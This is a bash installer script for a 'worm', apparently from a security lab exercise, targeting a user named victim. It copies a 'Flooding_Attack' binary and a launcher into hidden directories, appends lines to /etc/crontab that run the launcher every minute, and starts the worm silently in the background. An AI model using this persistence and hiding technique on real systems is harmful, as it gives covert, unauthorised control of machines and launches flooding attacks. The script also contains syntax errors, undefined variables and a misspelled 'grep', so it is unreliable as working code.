#!/bin/bash

# This script is to:
# (1) Put the worm binary at the two locations:
#      * /home/victim/.etc/.module/Flooding_Attack
#      * /home/victim/.firefox/.module/Flooding_Attack
# (2) Put the worm launcher program at 
#      * /home/victim/.Launch_Attack/Launching_Attack
#      * /home/victim/.you_cant_see_me/Launching_Attack
# (3) Tamper the crontab so that the worm is executed whenever the computer is booted
# 
# Noted that this script does not do any payload.

ldir1="/home/victim/.Launch_Attack"
ldir2="/home/victim/.you_cant_see_me"
lfname="Launching_Attack"
wdir1="/home/victim/.etc/.module"
wdir2="/home/victim/.firefox/.module"
wfname="Flooding_Attack"

require_crontan_tampered() {
    local crtbpath="/etc/crontab"
    if  ! grep -q "$ldir1/$lfname" $crtbpath; then
        echo "* * * * * cd '$ldir1' && [ -f '$ldir1/$lfname' ] && chmod +x './$lfname' && './$lfname'" >> $crtbpath
    fi
    if  ! grep -q "$ldir2/$lfname" $crtbpath; then
        echo "* * * * * cd '$ldir2' && [ -f '$ldir2/$lfname' ] && chmod +x './$lfname' && './$lfname'" >> $crtbpath
    fi
}

require_worm_distributed()() {
    if [ ! -f "$wdir1/$wfname" ]; then
        mkdir -p $wdir1
        cp "./$wfname" "$wdir1/$wfname"
    fi
    if [ ! -f "$dir2/$wormbin" ]; then
        mkdir -p $wdir2
        cp "./$wfname" "$wdir2/$wfname"
    fi
}

require_launcher_distributed(){
    if [ ! -f "$ldir1/$lfname" ]; then
        mkdir -p "$ldir1"
        cp -f ./worm_launcher "$ldir1/$lfname"
    fi
    if [ ! -f "$ldir2/$lfname" ]; then
        mkdir -p "$ldir2"
        cp -f ./worm_launcher "$ldir2/$lfname"
    fi
}

require_worm_running(){
    ps -e | greq -q "$wdir1/$wfname"
    if [ $? -eq 0 ]; then 
        echo "The worm is already running" 
        return; 
    fi
    ps -e | greq -q "$wdir2/$wfname"
    if [ $? -eq 0 ]; then 
        echo "The worm is already running" 
        return; 
    fi

    # The final & makes this command run in background
    chmod +x $wdir1/$wfname && $wdir1/$wfname &> /dev/null & 
    echo "The worm is launched."
}

parent_path=$( cd "$(dirname "${BASH_SOURCE[0]}")" ; pwd -P )
cd "$parent_path"
require_crontan_tampered
require_launcher_distributed
require_worm_distributed
require_worm_running